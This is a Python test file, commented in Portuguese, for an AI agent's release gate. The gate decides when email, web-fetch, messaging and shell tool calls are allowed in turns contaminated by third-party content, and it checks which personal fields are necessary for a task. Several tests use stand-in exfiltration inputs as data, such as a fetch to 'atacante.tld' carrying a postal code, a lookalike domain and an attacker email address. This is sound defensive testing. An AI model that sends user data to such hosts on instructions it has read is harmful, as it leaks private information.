"""F4: destino por tool, liberação destravando a saída, tabela de necessidade."""

from __future__ import annotations

from uuid import uuid4

import pytest

from core.authority import (
    PERMITIR,
    SOLICITAR,
    TurnAuthority,
    bind_authority,
    covering_release,
    destination_of,
    evaluate,
    gate_tool_call,
    payload_of,
    set_release_service,
)
from core.release.necessity import campos_desnecessarios, explicar, finalidade_conhecida


class _Rel:
    def __init__(self, destino, tipo="dominio", campos=("pks:cep",), payload_hash=None):
        self.id = uuid4()
        self.destino = destino
        self.destino_tipo = tipo
        self.campos = list(campos)
        self.payload_hash = payload_hash


# ── destino por tool ─────────────────────────────────────────────────────

def test_cada_saida_tem_seu_argumento_de_destino():
    assert destination_of("email_send", {"para": "Contato@Loja.com "}).valor == "contato@loja.com"
    assert destination_of("email_send", {"para": "a@x.com, b@y.com"}).valor == "a@x.com"
    assert destination_of("whatsapp_send_message", {"recipient": "5511999"}).tipo == "whatsapp"
    assert destination_of("service_request", {"service": "homeassistant"}).valor == "homeassistant"
    assert destination_of("web_fetch", {"url": "https://Loja.com.br/p?x=1"}).valor == "loja.com.br"


def test_sem_destino_endereçavel_devolve_none():
    # o navegador é guardado pelo preenchimento escopado, não por destino aqui
    assert destination_of("browser_local_task", {"task": "compra na loja"}) is None
    assert destination_of("neo_bash", {"command": "ls"}) is None
    assert destination_of("email_send", {}) is None  # sem destinatário


def test_payload_e_o_texto_que_foi_aprovado():
    assert payload_of("email_send", {"corpo": "oi"}) == "oi"
    assert payload_of("whatsapp_send_message", {"text": "oi"}) == "oi"
    assert payload_of("neo_bash", {"command": "ls"}) is None


# ── cobertura por liberação ──────────────────────────────────────────────

def test_liberacao_cobre_o_destino_aprovado():
    achado = covering_release(
        "web_fetch", {"url": "https://www.loja.com.br/frete"}, [_Rel("loja.com.br")]
    )
    assert achado is not None


def test_liberacao_nao_cobre_domínio_parecido():
    assert covering_release(
        "web_fetch", {"url": "https://loja.com.br.atacante.tld/x"}, [_Rel("loja.com.br")]
    ) is None
    assert covering_release(
        "web_fetch", {"url": "https://outraloja.com.br"}, [_Rel("loja.com.br")]
    ) is None


def test_email_exige_endereco_igual():
    rel = [_Rel("contador@x.com", tipo="email")]
    assert covering_release("email_send", {"para": "contador@x.com"}, rel) is not None
    assert covering_release("email_send", {"para": "outro@x.com"}, rel) is None


def test_tipo_de_destino_tem_que_casar():
    """Liberação de e-mail não autoriza mandar para um domínio, e vice-versa."""
    assert covering_release(
        "web_fetch", {"url": "https://contador@x.com"}, [_Rel("contador@x.com", tipo="email")]
    ) is None


def test_turno_contaminado_com_liberacao_passa():
    a = TurnAuthority()
    a.note_tool_result("web_fetch", "página da loja")
    sem = evaluate("email_send", a, {"para": "contato@loja.com.br"})
    com = evaluate(
        "email_send", a, {"para": "contato@loja.com.br"},
        approved=[_Rel("contato@loja.com.br", tipo="email")],
    )
    assert sem.efeito == SOLICITAR
    assert com.efeito == PERMITIR and com.release_id


def test_liberacao_de_outro_destino_nao_destrava():
    a = TurnAuthority()
    a.note_tool_result("web_fetch", "página")
    d = evaluate(
        "email_send", a, {"para": "atacante@mal.com"},
        approved=[_Rel("contato@loja.com.br", tipo="email")],
    )
    assert d.efeito == SOLICITAR


# ── portão: consulta e consumo ───────────────────────────────────────────

class _Service:
    def __init__(self, aprovadas, falha: str | None = None):
        self._aprovadas = aprovadas
        self.consumos: list = []
        self._falha = falha

    async def list_approved(self, user_id):
        return list(self._aprovadas)

    async def consume(self, rid, payload=None):
        if self._falha:
            raise RuntimeError(self._falha)
        self.consumos.append((str(rid), payload))


@pytest.mark.asyncio
async def test_portao_consome_a_liberacao_ao_permitir(monkeypatch):
    monkeypatch.setenv("NEO_RELEASE_GATE_MODE", "enforce")
    from shared.config import get_settings

    get_settings.cache_clear()
    rel = _Rel("contato@loja.com.br", tipo="email")
    svc = _Service([rel])
    set_release_service(svc)
    a = TurnAuthority(user_id=uuid4())
    a.note_tool_result("web_fetch", "página")
    token = bind_authority(a)
    try:
        d = await gate_tool_call(
            "email_send", {"para": "contato@loja.com.br", "corpo": "o CEP é 01234-567"}
        )
        assert d.efeito == PERMITIR
        assert svc.consumos == [(str(rel.id), "o CEP é 01234-567")]
    finally:
        from core.authority.turn import _current

        _current.reset(token)
        set_release_service(None)
        get_settings.cache_clear()


@pytest.mark.asyncio
async def test_texto_mudado_depois_da_aprovacao_nao_passa(monkeypatch):
    """O consumo é onde o payload_hash é conferido — e ele manda."""
    monkeypatch.setenv("NEO_RELEASE_GATE_MODE", "enforce")
    from shared.config import get_settings

    get_settings.cache_clear()
    svc = _Service([_Rel("contato@loja.com.br", tipo="email")], falha="o conteúdo mudou depois da aprovação")
    set_release_service(svc)
    a = TurnAuthority(user_id=uuid4())
    a.note_tool_result("web_fetch", "página")
    token = bind_authority(a)
    try:
        d = await gate_tool_call("email_send", {"para": "contato@loja.com.br", "corpo": "outro texto"})
        assert d.efeito == SOLICITAR
        assert "conteúdo mudou" in d.motivo
    finally:
        from core.authority.turn import _current

        _current.reset(token)
        set_release_service(None)
        get_settings.cache_clear()


@pytest.mark.asyncio
async def test_turno_limpo_nao_consulta_o_banco():
    """Custo zero no turno normal: o portão só pergunta se barraria."""
    svc = _Service([])
    consultas = []

    async def _list(user_id):
        consultas.append(user_id)
        return []

    svc.list_approved = _list  # type: ignore[assignment]
    set_release_service(svc)
    a = TurnAuthority(user_id=uuid4())
    token = bind_authority(a)
    try:
        d = await gate_tool_call("email_send", {"para": "x@y.com"})
        assert d.efeito == PERMITIR and consultas == []
    finally:
        from core.authority.turn import _current

        _current.reset(token)
        set_release_service(None)


# ── tabela de necessidade ────────────────────────────────────────────────

def test_frete_precisa_de_cep_nao_de_cpf():
    assert campos_desnecessarios("calcular o frete da cortina", ["cep"]) == []
    assert campos_desnecessarios("calcular o frete", ["cep", "cpf"]) == ["cpf"]
    assert "não é necessário" in explicar("calcular o frete", ["cpf"])


def test_nota_fiscal_justifica_cpf():
    assert campos_desnecessarios("emitir nota fiscal", ["cpf", "endereco"]) == []


def test_finalidade_desconhecida_nao_reprova():
    """Lista fechada viraria recusa em todo caso novo — e você desligaria tudo."""
    assert finalidade_conhecida("mandar o convite da festa") is None
    assert campos_desnecessarios("mandar o convite da festa", ["email", "cpf"]) == []


def test_pagamento_nao_admite_cartao():
    assert campos_desnecessarios("pagar o boleto", ["cpf"]) == []
    assert campos_desnecessarios("pagar com cartao", ["cartao"]) == ["cartao"]


def test_acento_e_maiuscula_nao_enganam():
    assert campos_desnecessarios("Calcular o FRETE", ["CPF"]) == ["CPF"]
    assert campos_desnecessarios("emitir a nota fiscal", ["endereço"]) == []


# ── procedência destrava o web_fetch ─────────────────────────────────────

def test_segunda_pagina_da_pesquisa_nao_se_auto_barra():
    """A 1ª página contamina o turno; ler a 2ª é a pesquisa funcionando."""
    a = TurnAuthority()
    a.note_tool_result("web_search", "achei em https://loja.com.br/dp/1 e https://b.com/x")
    d = evaluate("web_fetch", a, {"url": "https://loja.com.br/dp/1"})
    assert d.efeito == PERMITIR and "procedência" not in d.motivo.lower()


def test_url_inventada_em_turno_contaminado_pede_liberacao():
    a = TurnAuthority()
    a.note_tool_result("web_fetch", "página")
    d = evaluate("web_fetch", a, {"url": "https://atacante.tld/?d=01234-567"})
    assert d.efeito == SOLICITAR


def test_pedido_externo_nao_ganha_procedencia_de_graca():
    """Se a intenção veio de fora, ler a URL que ela citou continua sendo saída."""
    a = TurnAuthority(principal="externo", principal_ref="x@y.com")
    a.note_user_text("https://atacante.tld/p")
    assert evaluate("web_fetch", a, {"url": "https://atacante.tld/p"}).efeito == SOLICITAR


# ── modo 'revelacao': o degrau do meio ───────────────────────────────────

def _limpa_cache():
    from shared.config import get_settings

    get_settings.cache_clear()


@pytest.mark.asyncio
async def test_modo_revelacao_barra_email_e_deixa_terminal_passar(monkeypatch):
    monkeypatch.setenv("NEO_RELEASE_GATE_MODE", "revelacao")
    _limpa_cache()
    set_release_service(None)
    a = TurnAuthority(user_id=uuid4())
    a.note_tool_result("web_fetch", "página hostil")
    token = bind_authority(a)
    try:
        email = await gate_tool_call("email_send", {"para": "atacante@x.com", "corpo": "cpf"})
        shell = await gate_tool_call("run_command", {"command": "ls"})
        assert email.blocked          # revelação: barra
        assert not shell.blocked      # atuação: segue em sombra
    finally:
        from core.authority.turn import _current

        _current.reset(token)
        _limpa_cache()


@pytest.mark.asyncio
async def test_modo_revelacao_mantem_a_trava_de_persistencia(monkeypatch):
    """Agendar prompt a partir de texto de terceiro não tem exceção."""
    monkeypatch.setenv("NEO_RELEASE_GATE_MODE", "revelacao")
    _limpa_cache()
    a = TurnAuthority(user_id=uuid4())
    a.note_tool_result("email_message", "corpo do e-mail")
    token = bind_authority(a)
    try:
        d = await gate_tool_call("schedule_create", {"acao_tipo": "prompt", "texto": "x"})
        assert d.blocked and "não tem exceção" in d.mensagem()
    finally:
        from core.authority.turn import _current

        _current.reset(token)
        _limpa_cache()


def test_a_recusa_ensina_o_caminho_de_volta():
    from core.authority import GateDecision

    revelacao = GateDecision(SOLICITAR, "motivo", "email_send").mensagem()
    assert "solicitar_dado(" in revelacao and "ENCERRE o turno" in revelacao
    atuacao = GateDecision(SOLICITAR, "motivo", "run_command").mensagem()
    assert "solicitar_dado" not in atuacao  # não existe card para terminal
    assert "diga ao Daniel" in atuacao
